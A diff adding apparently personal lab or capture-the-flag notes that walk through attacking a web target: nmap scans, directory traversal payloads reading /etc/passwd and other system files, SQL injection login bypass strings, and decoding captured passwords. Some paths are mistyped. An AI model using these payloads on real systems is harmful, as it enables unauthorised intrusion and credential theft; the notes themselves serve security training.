@@ -763,16 +763,41 @@ EX: UNION SELECT userid,username,passwd FROM users
 
 Tables are one compared to columns which have multiple selections in one choice 
 
+Start
+nmap the first target IP and scripts
 
+nmap -v -sT -Pn -T4 -sV 10.50.X.X 
+- shows ssh and http up
+nmap -v -sT -Pn -T4 -sV --script =http-enum.nse 10.50.X.X -p 80
+- shows availble pages on the webssite
 
+check for robots.txt on the website
+localhost:<RHP>/robots.txt
 
+Do some enumerating on the machine for informantion  
+Directory Traversal
+;../../../../../../../../../etc/passwd
+;../../../../../../../../..etc/resovle.conf
+;../../../../../../../../..etc/network
+;../../../../../../../../..etc/hosts ( find a different network ) 
+;../../../../../../../../..etc/groups
 
+Couldn't upload script because no upload directory for the sever to take 
+SQL Injection
+username: TOM' OR 1='1
+password: TOM' OR 1='1
 
+/login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1
 
+or 
+username: fhjshis' OR 1='1
+password: fhjshis' OR 1='1
 
-
-
-
+hit F12 for developer tools 
+- network tab and login on the firefox tab
+- click http request and see the two fields that were submitted 
+- change to raw add a questionmark after php, copy and paste the raw text for passwords
+- go to cyberchef for password decryption ROT13 or Base64 
 
 
 
